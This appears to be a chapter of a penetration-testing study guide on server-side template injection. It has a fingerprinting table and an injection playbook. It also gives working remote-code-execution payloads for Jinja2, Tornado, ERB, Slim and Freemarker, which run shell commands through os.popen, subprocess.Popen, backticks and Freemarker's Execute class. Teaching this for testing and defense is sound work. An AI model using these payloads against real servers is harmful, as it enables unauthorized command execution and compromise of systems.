# Ch 12 — Server-Side Template Injection (SSTI)

> **Marker ceiling:** `{{7*7}}`→`49` or `{{config}}` proves injection — the Jinja2/Tornado/ERB RCE chains below are escalation narrative. `payloads-all-the-things` ch04 sets the same ceiling.

MVC: controller → model → **view = template engine** — placeholders like `{{name}}` replaced at render. Engines are powerful: functions, methods, loops, arithmetic → user input concatenated into a template = code execution. Impact ranges: info leak → file read → **RCE**.

## Detect + fingerprint

| Payload | Result | Engine |
|---------|--------|--------|
| `{{7*7}}` | `49` | Jinja2/Tornado (Python) — also Twig etc. |
| `{{7*'7'}}` | `7777777` | **Jinja2** (string mult) — vs `49` on Twig |
| `${7*7}` | `49` | Freemarker (Java) |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `#{7*7}` | `49` | Slim (Ruby) |

## Python — Jinja2 (Flask/Django)

Chain: object → `__class__` → `__mro__`/`__base__` → `__subclasses__()` → find `subprocess.Popen`/file classes → run commands.

```python
''.__class__.__mro__            # MRO = class lookup order; index [1] = root object
[].__class__.__base__           # alternative handle to root object
{{[].__class__.__mro__[1].__subclasses__()}}          # enumerate ALL classes
{{[].__class__.__mro__[1].__subclasses__()[-3]('whoami',shell=True,stdout=-1).communicate()[0]}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}   # alt RCE via os
```

Enumerate subclasses — index varies per app; look for `subprocess.Popen`, `os`, `file`, warnings/catch_warnings tricks. **Severity depends on reachable classes**: Popen → RCE; file → read/write; neither → probe further.

## Python — Tornado

Engine can `import` arbitrary Python libraries — trivial RCE:

```
{% import os %}{{ os.popen("whoami").read() }}
{% import subprocess %}{{ subprocess.Popen('whoami',shell=True,stdout=-1).communicate()[0] }}
```

## Ruby — ERB

Tags: `<% code %>` executes, `<%= code %>` executes + prints.

```erb
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline() %>
```

## Ruby — Slim

`#{ code }` interpolation → backticks for shell: `#{ `whoami` }` — then any Ruby.

## Java — Freemarker

`${7*7}` to detect; instantiate `Execute` via `?new()` for RCE:

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami") }
${"freemarker.template.utility.Execute"?new()("whoami")}
```

## Playbook

1. Inject `{{7*7}}`/`${7*7}`/`<%=7*7%>` in every input that lands in templates (names, comments, error pages, emails).
2. Fingerprint via `{{7*'7'}}` behavior + error messages.
3. Load the matching RCE chain above; enumerate classes/objects if Popen isn't directly reachable.
4. Report: SSTI ≈ RCE on the server — critical.
